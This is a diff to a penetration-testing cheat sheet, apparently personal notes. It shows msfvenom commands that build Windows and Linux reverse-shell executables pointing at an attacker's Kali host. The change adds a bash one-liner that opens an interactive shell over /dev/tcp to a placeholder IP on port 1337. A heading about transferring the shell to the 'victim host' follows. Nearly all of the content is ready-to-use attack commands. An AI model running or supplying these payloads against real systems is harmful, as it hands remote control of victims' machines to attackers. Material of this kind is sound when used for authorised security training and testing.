@@ -1,5 +1,6 @@
 
-## Generate shell with MSFvenom
+## Generate shell 
+### with MSFvenom
 https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
 ```
 # Basic Windows shell
@@ -7,6 +8,12 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4445 -f exe > shell.
 
 # Basic Linux shell
 msfvenom -p linux/x86/shell/reverse_tcp LHOST=<KALI_IP> LPORT=4445 -f elf > shell.elf
+```
+### Simple bash reverse shell
+Save it as shell.sh
+```
+#!/bin/bash
+bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1
 ```
 
 ## Transfer the shell to the victim host
